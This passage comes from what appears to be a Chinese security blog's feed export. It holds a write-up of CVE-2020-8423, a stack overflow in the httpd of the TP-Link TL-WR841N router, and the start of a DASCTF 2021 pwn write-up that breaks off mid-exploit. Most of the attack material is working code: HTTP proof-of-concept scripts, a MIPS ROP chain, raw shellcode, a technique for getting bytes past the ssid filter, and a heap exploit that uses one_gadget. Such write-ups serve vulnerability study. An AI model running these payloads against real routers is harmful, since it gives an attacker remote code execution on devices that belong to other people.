class="keyword">int</span> __fastcall <span class="title">writePageParamSet</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">512</span>]; <span class="comment">// [sp+18h] [-200h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    HTTP_DEBUG_PRINT(<span class="string">&quot;basicWeb/httpWebV3Common.c:178&quot;</span>, <span class="string">&quot;Never Write NULL to page, %s, %d&quot;</span>, <span class="string">&quot;writePageParamSet&quot;</span>, <span class="number">178</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(a2, <span class="string">&quot;\&quot;%s\&quot;,&quot;</span>, a3) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strcmp</span>(a2, <span class="string">&quot;%d,&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      result = httpPrintf(a1, (<span class="keyword">const</span> <span class="keyword">char</span> *)a2, *(_DWORD *)a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( stringModify(v8, <span class="number">512</span>, (<span class="keyword">int</span>)a3) &lt; <span class="number">0</span> )   <span class="comment">// overflow</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;string modify error!&quot;</span>);</span><br><span class="line">      v8[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result = httpPrintf(a1, (<span class="keyword">const</span> <span class="keyword">char</span> *)a2, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>writePageParamSet 交叉调用查询上层函数 a3 传入内容是怎么处理。上层函数地址是 <code>0x00457574</code> ，ida 没有分析出来函数，跳转到这个地址，然后快捷键 P 或者右键 create function ，新建函数再 F5 即可。</p><p>Sub_00457574 httpGetEnv(a1, “ssid”) 提取出 ssid 存放到 v79 里面：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210411152043.png" alt="image-20210411152035550"></p><p>然后就传递给 writePageParamSet ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210411152110.png" alt="image-20210411152109406"></p><h2 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=<span class="string">&quot;/hook.so&quot;</span></span><br><span class="line">./gdbserver 0.0.0.0:2333  /usr/bin/httpd</span><br></pre></td></tr></table></figure><p>从程序开始调试，gdb 找不到函数，应该是类似 ida 中分析不出来的函数，不知道是不是 hook 之后导致的。调试一直 c 错误提示了很多次都还是进不来 web 界面，最后采用 gdbserver attach 进行调试，因为后台 URL 有个随机路径，需要在 web 端登录后查看</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210413234536.png" alt="image-20210413234535498"></p><ol><li><p>运行 httpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=<span class="string">&quot;/hook.so&quot;</span> /usr/bin/httpd</span><br></pre></td></tr></table></figure></li><li><p>查看进程 PID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree -p</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210415003958.png" alt="image-20210415003957329"></p></li><li><p>获取 url 随机路径</p><p>登录账号，获取随机路径，免得 attach 之后调很久才返回 web 界面，cookie 固定没变获取一次就行</p><blockquote><p>不在一个网段的需要 ssh 转发一下流量</p><p>ssh -D 7878 192.168.0.1</p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210415004909.png" alt="image-20210415004908740"></p></li><li><p>启动 gdbserver</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver 0.0.0.0:1234 --attch 2529</span><br></pre></td></tr></table></figure></li><li><p>验证 URL 字符串替换规则</p><blockquote><p>ssid 先进行 unquote 解码，python request 发送数据再进行编码，这样程序接收到才是我们预期的 <code>\n</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">path,cookie</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;Authorization=Basic&#123;cookie&#125;&quot;</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))</span><br><span class="line">        &#125;</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">&quot;/%0A&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    params = &#123;</span><br><span class="line">    <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;curRegion&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;chanWidth&quot;</span>:<span class="string">&quot;100&quot;</span>,</span><br><span class="line">    <span class="string">&quot;channel&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>:urllib.request.unquote(payload)</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&quot;http://192.168.0.1:80/&#123;path&#125;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line">exp(<span class="string">&quot;QWKQGMIBVQHESHIB&quot;</span>,<span class="string">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span>)</span><br></pre></td></tr></table></figure><p>断点打在 stringModify 调用处：0x0043BC24 ，多 c 几次就到处理 ssid 部分。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210415161312.png" alt="image-20210415161311299"></p><p><code>/%0A</code> 被转换为 4 字节的 <code>\\/&lt;br&gt;</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210415162431.png"></p></li></ol><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>执行后会报段错误，原因是 writePageParamSet 函数返回地址被修改了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">path,cookie</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;Authorization=Basic&#123;cookie&#125;&quot;</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))</span><br><span class="line">        &#125;</span><br><span class="line">    payload=<span class="string">&quot;/%0A&quot;</span>*<span class="number">0x55</span> + <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">    <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;curRegion&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;chanWidth&quot;</span>:<span class="string">&quot;100&quot;</span>,</span><br><span class="line">    <span class="string">&quot;channel&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>:urllib.request.unquote(payload)</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&quot;http://192.168.0.1:80/&#123;path&#125;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line">exp(<span class="string">&quot;HPAMPJEASUZYOYGB&quot;</span>,<span class="string">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="获取偏移"><a href="#获取偏移" class="headerlink" title="获取偏移"></a>获取偏移</h3><p>为了方便查看在 <code>0x0043BC24</code> 和 <code>0x0043bca8</code> 下断点，前者观察 ssid 传入值是否符合预期，后者观察 writePageParamSet 返回上层函数时的寄存器状态。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210415220218.png" alt="image-20210415220216693"></p><p>填充 <code>&quot;/%0A&quot;*0x55+&#39;aa&#39;</code> 之后，依次可以控制 s0-s02 、ra 寄存器的值。</p><h3 id="shellcode-调用框架"><a href="#shellcode-调用框架" class="headerlink" title="shellcode 调用框架"></a>shellcode 调用框架</h3><p>之前做 <a href="https://www.mrskye.cn/archives/6f13cd09/#stack-bof-02">DVRF</a> 记录过，mips 存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode 。</p><blockquote><p>mips 调用 shellcode 构造模板：</p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">https://www.cnblogs.com/hac425/p/9416864.html</a></p><p><a href="https://www.anquanke.com/post/id/179510">https://www.anquanke.com/post/id/179510</a></p></blockquote><p>整体流程图：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210415223922.png" alt="图源：https://www.anquanke.com/post/id/179510"></p><p>构造的调用 shellcode 框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="number">0x77471000</span></span><br><span class="line">sleep_addr = base+<span class="number">0x0053ca0</span></span><br><span class="line">rop1=base+<span class="number">0x00055c60</span></span><br><span class="line">rop2=base+<span class="number">0x00037470</span></span><br><span class="line">rop3=base+<span class="number">0x0000e904</span></span><br><span class="line">rop4=base+<span class="number">0x000374d8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/%0A&quot;</span>*<span class="number">0x55</span> + <span class="string">b&quot;aa&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;s0s0&quot;</span></span><br><span class="line">payload += p32(rop2)</span><br><span class="line">payload += p32(sleep_addr)</span><br><span class="line">payload += p32(rop1)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p32(rop4)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(rop3)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure><h3 id="shellcode-改造"><a href="#shellcode-改造" class="headerlink" title="shellcode 改造"></a>shellcode 改造</h3><p>程序会对 ssid 输入内容在 <code>stringModify</code> 进行过滤，导致 shellcode 中的 <code>lui</code> 指令的字节码 <code>0x3c(&lt;)</code> 被替换，所以需要对 shellcode 进行改造。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210417111258.png" alt="image-20210416155734163"></p><p>这里用到一个新学的方法<strong>指令逃逸</strong> 。使用一些无关指令，如填充ori t3,t3,0xff3c指令时，3c 会被编码成 5c3c，那么这时候3c就逃逸到下一个内存空间中，这个 3c 就可以继续使用了（针对于开头为 3c 的汇编指令）。</p><ol><li><p>类似于 <a href="https://www.mrskye.cn/archives/6f13cd09/#stack-bof-02">DVRF</a> 中，找一个无用寄存器，填充指令 <code>ori $t1,$t1,0xff3c</code> ，对应的汇编机器码：<code>\x35\x29\xFF\x3C</code> </p></li><li><p>汇编中的 <code>\x3c</code> 进入 <code>stringModify</code> 被替换为 <code>\x5c\x3c</code> ，<code>\x3x</code> 就逃逸到下一个内存空间（mips 指令固定 4 字节）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\x35\x29\xFF\x3C</span><br><span class="line">||</span><br><span class="line">||</span><br><span class="line">VV</span><br><span class="line">\x35\x29\xFF\x5c</span><br><span class="line">\x3C</span><br></pre></td></tr></table></figure></li><li><p>在下一个内存空间填充剩下 3 字节组成预期指令。假设预期指令：<code>lui $t6, 0x7a69</code>，对应汇编：<code>\x3c\x0e\x7a\x69</code> ，那就是填入 <code>\x0e\x7a\x69</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x35\x29\xFF\x3C#ori $t1,$t1,0xff3c</span><br><span class="line">\x0e\x7a\x69</span><br><span class="line">||</span><br><span class="line">||</span><br><span class="line">VV</span><br><span class="line">\x35\x29\xFF\x5c#ori $t1,$t1,0xff5c</span><br><span class="line">\x3C\x0e\x7a\x69#lui $t6, 0x7a69</span><br></pre></td></tr></table></figure></li></ol><p>shellcode 改造后，注意 payload 长度有没有超过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./squashfs-root/usr/bin/httpd&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line">base = <span class="number">0x77471000</span></span><br><span class="line">sleep_addr = base+<span class="number">0x0053ca0</span></span><br><span class="line">rop1=base+<span class="number">0x00055c60</span></span><br><span class="line">rop2=base+<span class="number">0x00037470</span></span><br><span class="line">rop3=base+<span class="number">0x0000e904</span></span><br><span class="line">rop4=base+<span class="number">0x000374d8</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x24\x0e\xff\xfd\x01\xc0\x20\x27\x01\xc0\x28\x27\x28\x06\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x34\x0e\xff\xff\x01\xc0\x70\x27\xaf\xae\xff\xf6\xaf\xae\xff\xf4&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x34\x0f\xd8\xf0\x01\xe0\x78\x27\xaf\xaf\xff\xf2\x34\x0f\xff\xfd&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x01\xe0\x78\x27\xaf\xaf\xff\xf0\x27\xa5\xff\xf2\x24\x0f\xff\xef&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x01\xe0\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x8f\xa4\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x28\x05\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x2c\x05\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\xff\xfd\x01\xc0\x28\x27&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\x3d\x28\xaf\xae\xff\xe2&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x0e\x77\xf9\xaf\xae\xff\xe0\x8f\xa4\xff\xe2\x28\x05\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/%0A&quot;</span>*<span class="number">0x55</span> + <span class="string">&quot;aa&quot;</span></span><br><span class="line">payload += <span class="string">&quot;s0s0&quot;</span></span><br><span class="line">payload += p32(rop2)</span><br><span class="line">payload += p32(sleep_addr)</span><br><span class="line">payload += p32(rop1)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p32(rop4)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(rop3)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">path,cookie</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;Authorization=Basic&#123;cookie&#125;&quot;</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))</span><br><span class="line">        &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">    <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;curRegion&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;chanWidth&quot;</span>:<span class="string">&quot;100&quot;</span>,</span><br><span class="line">    <span class="string">&quot;channel&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>:urllib.unquote(payload)<span class="comment">#urllib.request.unquote(payload)</span></span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&quot;http://192.168.0.1:80/&#123;path&#125;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line">exp(<span class="string">&quot;CAFWYCFAVKWYRUKB&quot;</span>,<span class="string">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span>)</span><br></pre></td></tr></table></figure><p>qemu 模拟的原因，nc 连上去后运行不了：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210417013814.png" alt="image-20210416151231760"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA">http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA</a></p><p><a href="https://ktln2.org/2020/03/29/exploiting-mips-router/">https://ktln2.org/2020/03/29/exploiting-mips-router/</a></p><p><a href="https://www.anquanke.com/post/id/203486">https://www.anquanke.com/post/id/203486</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TPLink </tag>
            
            <tag> TL-WR841N </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021DASCTF四月赛Writeup</title>
      <link href="archives/b88f4a53/"/>
      <url>archives/b88f4a53/</url>
      
        <content type="html"><![CDATA[<h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><p>malloc 申请 size 没有上限，后面会输出堆地址。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210329174638.png" alt="image-20210329174629968"></p><p>申请大 size 堆，以 mmap 方式分配，得到的堆地址在 libc 附近。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210329174911.png" alt="image-20210329174910143"></p><p>需要用 realloc 调整堆栈让 onegadget 生效，最后关闭了 stdout ，手动打开<code>exec 1&gt;&amp;0</code></p><blockquote><p><a href="https://blog.csdn.net/xirenwang/article/details/104139866">exec 1&gt;&amp;0 - luooofan</a></p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./fruitpie&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fruitpie&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com&quot;,51302)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;malloc:&quot;</span>)</span><br><span class="line"><span class="comment"># p.send(str(0xffffff))</span></span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x23002</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">libc_base = heap_addr - <span class="number">0x5ac010</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line"></span><br><span class="line">offset = realloc_hook-heap_addr</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook-heap_addr:&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, 